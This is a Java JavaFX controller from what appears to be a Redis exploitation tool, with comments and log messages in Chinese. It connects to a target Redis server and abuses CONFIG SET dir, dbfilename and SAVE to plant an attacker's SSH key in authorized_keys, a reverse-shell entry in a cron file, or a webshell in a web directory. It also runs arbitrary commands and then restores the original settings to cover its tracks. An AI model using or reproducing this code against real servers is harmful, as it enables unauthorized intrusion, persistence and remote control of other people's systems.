package org.fasnow.mutiple.app.ui.controller;

import javafx.application.Platform;
import javafx.event.ActionEvent;
import javafx.event.Event;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.scene.layout.GridPane;
import org.fasnow.mutiple.app.Log;
import org.fasnow.mutiple.app.Utils;
import org.fasnow.mutiple.app.model.redis.Redis;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.CompletableFuture;

public class RedisController {

    @FXML
    private Button writeWebshellBtn;

    @FXML
    private TextField webpath;

    @FXML
    private TextArea detectLog;

    @FXML
    private Button batchSubmitBtn;

    @FXML
    private TextField cronDirField;

    @FXML
    private TabPane tabs;

    @FXML
    private TextArea description;

    @FXML
    private TextArea cmdExecLog;

    @FXML
    private TextField weshellFilenameField;

    @FXML
    private TextField sshAuthorizedKeysField;

    @FXML
    private TextField reverseShellField;

    @FXML
    private TextField currentUserField;

    @FXML
    private Tab descTab;

    @FXML
    private Button getInfoBtn;

    @FXML
    private TextArea webshellField;

    @FXML
    private TextField dirField;

    @FXML
    private TextField passwordField;

    @FXML
    private Button writeSSHPubkeyBtn;

    @FXML
    private Button reverseShellSubmitBtn;

    @FXML
    private TextField threadField;

    @FXML
    private Button submitBtn;

    @FXML
    private Button setDBFilenameBtn;

    @FXML
    private Button importBtn;

    @FXML
    private TextField hostField;

    @FXML
    private TextArea batchDetectLog;

    @FXML
    private TextArea writeWebshellLog;

    @FXML
    private GridPane basePanel;

    @FXML
    private TextArea sshPubkeyField;

    @FXML
    private TextField portField;

    @FXML
    private TextArea cronShellLog;

    @FXML
    private TextArea writeSSHPubkeyLog;

    @FXML
    private Button clearReverseShellBtn;

    @FXML
    private Button cmdSubmitBtn;

    @FXML
    private TextField fileField;

    @FXML
    private ComboBox<?> vulCB1;

    @FXML
    private Button setDirBtn;

    @FXML
    private TextField dbfilenameField;

    @FXML
    private TextField cmdField;

    @FXML
    private TextField versionField;

    @FXML
    private TextField osNameField;

    private MainController mainController;

    Redis redisInstance = new Redis();

    @FXML // This method is called by the FXMLLoader when initialization is complete
    void initialize() {
        vulCB1.setVisible(false);
        submitBtn.setVisible(false);
        hostField.textProperty().addListener((observable, oldValue, newValue) -> {
            if(redisInstance.isConnected()) {
                redisInstance.close();
            }
        });
        portField.textProperty().addListener((observable, oldValue, newValue) -> {
            if(redisInstance.isConnected()) {
                redisInstance.close();
            }
        });
//        tabs.getTabs().remove(2);
//        tabs.getTabs().remove(2);
//        tabs.getTabs().remove(5);
//        List<String> nameList = new ArrayList<>();
//        List<String> descList = new ArrayList<>();
//        for (Map.Entry<String, Vul> entry : Nacos.vuls.entrySet()) {
//            Vul vul = entry.getValue();
//            String vulName= vul.getName();
//            vulNameMethodMap.put(vulName,entry.getKey());
//            nameList.add(0,vulName);
//            descList.add(
//                    "漏洞名称: " + vulName + "\n\n" +
//                            "影响版本: " + vul.getAffectedVersion() + "\n\n" +
//                            "参考链接: " + vul.getRefUrl()
//            );
//        }
//        if(nameList.size()>1){
//            nameList.add(0,"All");
//        }
//        ObservableList<String> observableNames = FXCollections.observableArrayList(nameList);
//        vulCB1.setItems(observableNames);
//        vulCB1.getSelectionModel().selectFirst();
//        description.setText(String.join("\n\n\n",descList));
//
//        ToggleGroup toggleGroup = new ToggleGroup();
//        useAuth.setToggleGroup(toggleGroup);
//        useVul.setToggleGroup(toggleGroup);
//        useToken.setToggleGroup(toggleGroup);
//
//        exportBtn.setVisible(false);
        Utils.setGlobalFocusTraversal(false,basePanel);
    }
    public void setMainController(MainController controller){
        mainController = controller;
    }

    public MainController getMainController(){
        return mainController;
    }

    public void submitBtnAction(Event event){
        String targetUrl = hostField.getText();
        if("".equals(targetUrl.trim())){
            return;
        }
        try {
            redisInstance.setTarget(targetUrl);
        } catch (Exception e) {
            detectLog.appendText(Log.formatStderr(e));
            return;
        }
        tabs.getSelectionModel().select(1);

    }
    public void batchSubmitBtnAction(Event event) {

    }

    @FXML
    void setDirBtnAction(ActionEvent event) {
        String dir = dirField.getText();
        CompletableFuture.supplyAsync(() -> {
            setDirBtn.setDisable(true);
            try {
                preAction();
                cronShellLog.appendText(Log.formatStdout(redisInstance.setDir(dir)));
                return null;
            } catch (Exception e) {
                cronShellLog.appendText(Log.formatStderr(e));
                return null;
            }
        }).thenAccept(result->{
            setDirBtn.setDisable(false);
            redisInstance.close();
        });
    }

    @FXML
    void setDBFilenameBtnAction(ActionEvent event) {
        String dbfilename = dbfilenameField.getText();
        CompletableFuture.supplyAsync(() -> {
            setDBFilenameBtn.setDisable(true);
            try {
                preAction();
            } catch (Exception e) {
                cronShellLog.appendText(Log.formatStderr(e));
                return null;
            }
            cronShellLog.appendText(Log.formatStdout(redisInstance.setDBFilename(dbfilename)));
            return null;
        }).thenAccept(result->{
            setDBFilenameBtn.setDisable(false);
            redisInstance.close();
        });
    }

    @FXML
    void getInfoBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            getInfoBtn.setDisable(true);
            tabs.getSelectionModel().select(1);
            try {
                preAction();
            } catch (Exception e) {
                detectLog.appendText(Log.formatStderr(e));
                return null;
            }
            String redisInfo = redisInstance.getInfo();
            dirField.setText(redisInstance.getDir());
            dbfilenameField.setText(redisInstance.getDBFilename());
            versionField.setText(redisInstance.getVersion(redisInfo));
            osNameField.setText(redisInstance.getOsName(redisInfo));
            detectLog.appendText(Log.formatStdout(redisInfo));
            return null;
        }).thenAccept(result->{
            getInfoBtn.setDisable(false);
            redisInstance.close();
        });

    }

    @FXML
    void clearReverseShellBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String dir = cronDirField.getText();
            String dbFilename = currentUserField.getText();
            Platform.runLater(()->clearReverseShellBtn.setDisable(true));
            try {
                preSetDumpConfig(dir,dbFilename,cronShellLog,"","");
            } catch (Exception e) {
                Platform.runLater(() ->cronShellLog.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->clearReverseShellBtn.setDisable(false));
            redisInstance.close();
        });
    }

    private void postSetDumpConfig(String currentDir, String currentDBFilename, TextArea logArea, String key) throws InterruptedException {
        Platform.runLater(() ->logArea.appendText(Log.formatStdout("正在恢复原状态")));
        if(!"".equals(key)){
            Platform.runLater(() ->logArea.appendText(Log.formatStdout(String.format("删除Key：del %s",key))));
            Platform.runLater(() ->logArea.appendText(Log.formatStdout("删除Key返回结果："+redisInstance.delKey(key))));
            Thread.sleep(500);
        }
        Platform.runLater(() -> logArea.appendText(Log.formatStdout(String.format("恢复dump目录：config set dir %s",currentDir))));
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("恢复dump目录返回结果："+redisInstance.setDir(currentDir))));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout(String.format("恢复dump文件：config set dbfilename %s",currentDBFilename))));
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("恢复dump文件返回结果："+redisInstance.setDBFilename(currentDBFilename))));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("提交更改：save")));
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("提交更改结果："+redisInstance.save())));
    }

    private List<String> setDumpConfig(TextArea logArea, String dir, String dbFilename, String key, String value) throws InterruptedException {
        List<String> result = new ArrayList<>();
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("获取当前dump目录：config get dir" )));
        String currentDir = redisInstance.getDir();
        result.add(currentDir);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("当前dump目录：" + currentDir)));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("获取当前dump文件：config get dbfilename")));
        String currentDBFilename = redisInstance.getDBFilename();
        result.add(currentDBFilename);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("当前dump文件：" + currentDBFilename)));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout(String.format("设置dump目录：config set dir \"%s\"", dir))));
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("设置dump目录返回结果：" + redisInstance.setDir(dir))));
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout(String.format("设置dump文件：config set dbfilename \"%s\"", dbFilename))));
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("设置dump文件返回结果：" + redisInstance.setDBFilename(dbFilename))));
        if(!"".equals(key)){
            Thread.sleep(500);
            Platform.runLater(() ->logArea.appendText(Log.formatStdout(String.format("设置Key：set %s \"%s\"",key,value.replace("\n","\\n")))));
            Platform.runLater(() ->logArea.appendText(Log.formatStdout("设置Key返回结果："+redisInstance.setKey(key,value))));
        }
        Thread.sleep(500);
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("提交更改：save")));
        Platform.runLater(() -> logArea.appendText(Log.formatStdout("提交更改返回结果：" + redisInstance.save())));
        return result;
    }

    private void preSetDumpConfig(String dir, String dbfilename, TextArea logArea, String key, String value) throws InterruptedException {
        try {
            preAction();
        } catch (Exception e) {
            Platform.runLater(() ->logArea.appendText(Log.formatStderr(e)));
            return;
        }
        try {
            List<String> dump = setDumpConfig(logArea,dir,dbfilename,key,value);
            postSetDumpConfig(dump.get(0),dump.get(1),logArea,key);
        } catch (Exception e) {
            Platform.runLater(() ->logArea.appendText(Log.formatStderr(e)));
        }
    }


    @FXML
    void writeSSHPubkeyBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String dir = sshAuthorizedKeysField.getText();
            String dbfilename = "authorized_keys";
            String value = "\n\n"+sshPubkeyField.getText()+"\n";
            String key = Utils.getRandomString(6);
//            key = "y";
            Platform.runLater(() ->writeSSHPubkeyBtn.setDisable(true));
            try {
                preSetDumpConfig(dir,dbfilename,writeSSHPubkeyLog,key,value);
            } catch (Exception e) {
                Platform.runLater(() ->writeSSHPubkeyLog.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
                Platform.runLater(()->writeSSHPubkeyBtn.setDisable(false));
            redisInstance.close();
        });
    }

    @FXML
    void reverseShellSubmitBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String dir = cronDirField.getText();
            String dbfilename = currentUserField.getText();
            String value = "\n"+reverseShellField.getText()+"\n";
            String key = Utils.getRandomString(6);
//            key = "x";
            Platform.runLater(() -> reverseShellSubmitBtn.setDisable(true));
            try {
                preSetDumpConfig(dir,dbfilename,cronShellLog,key,value);
            } catch (Exception e) {
                Platform.runLater(() ->cronShellLog.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->reverseShellSubmitBtn.setDisable(false));
            redisInstance.close();
        });
    }

    @FXML
    void writeWebshellBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String dir = webpath.getText();
            String dbfilename = weshellFilenameField.getText();
            String value = "\n\n"+webshellField.getText()+"\n\n";
            String key = Utils.getRandomString(6);
//            key = "z";
            Platform.runLater(()->writeWebshellBtn.setDisable(true));
            try {
                preSetDumpConfig(dir,dbfilename,writeWebshellLog,key,value);
            } catch (InterruptedException e) {
                Platform.runLater(() ->writeWebshellLog.appendText(Log.formatStderr(e)));
            }
            return null;
        }).thenAccept(result->{
            Platform.runLater(()->writeWebshellBtn.setDisable(false));
            redisInstance.close();
        });
    }

    @FXML
    void cmdSubmitBtnAction(ActionEvent event) {
        CompletableFuture.supplyAsync(() -> {
            String cmd = cmdField.getText();
            String[] fields = Utils.fields(cmd);
            Platform.runLater(()->cmdSubmitBtn.setDisable(true));
            try {
                preAction();
            } catch (Exception e) {
                Platform.runLater(()->cmdExecLog.appendText(Log.formatStderr(e)));
                return null;
            }
            try {
                Platform.runLater(()->cmdExecLog.appendText(Log.formatStdout(String.join(" ",fields))));
                String result = redisInstance.exec(cmd);
//                List<String> r = redisInstance.execRedisCommand(cmd);
//                r.forEach(System.out::println);
                Platform.runLater(()->cmdExecLog.appendText(Log.formatStdout(result)));
                return null;
            } catch (Exception e) {
                Platform.runLater(()->cmdExecLog.appendText(Log.formatStderr(e)));
                return null;
            }
        }).thenAccept(result->{
            Platform.runLater(()->cmdSubmitBtn.setDisable(false));
            redisInstance.close();
        });
    }

    void preAction() throws Exception {
        String host = hostField.getText();
        int port = Integer.parseInt(portField.getText());
        String password = passwordField.getText();
        redisInstance.connect(host,port,password,10*1000);
        if(!redisInstance.isConnected()){
            throw new Exception("无法连接");
        }
    }

    List<String> targets = new ArrayList<>();
    public void importBtnAction(Event event){
        Map<String,List<String>> result = Utils.getTargetUrls();
        for (Map.Entry<String,List<String>> entry:
                result.entrySet()) {
            String filename = entry.getKey();
            if("".equals(filename)){
                return;
            }
            fileField.setText(filename);
            targets =  entry.getValue();
        }
        System.out.println(fileField.getText());
        if(targets.size()==0){
            batchDetectLog.appendText(Log.formatStderr(new Exception("目标不能为空")));
        }
    }
}
